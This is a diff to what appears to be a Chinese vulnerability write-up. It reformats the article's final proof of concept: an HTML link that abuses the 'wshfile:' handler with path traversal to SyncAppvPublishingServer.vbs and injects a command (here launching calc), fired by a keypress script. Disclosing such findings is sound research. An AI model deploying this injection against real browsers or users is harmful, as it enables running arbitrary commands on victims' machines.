@@ -86,12 +86,12 @@
 ## 最后
 
 最终的 Poc 如下所示：
-
-`<a id="q" href='wshfile:test/../../WinSxS/AMD921~1.48_/SyncAppvPublishingServer.vbs" test test;calc;"'>test</a>`
-
-`<script>
+```
+<a id="q" href='wshfile:test/../../WinSxS/AMD921~1.48_/SyncAppvPublishingServer.vbs" test test;calc;"'>test</a>
+<script>
 window.onkeydown=e=>{
 	window.onkeydown=z={};
 	q.click()
 }
-</script>`
+</script>
+```
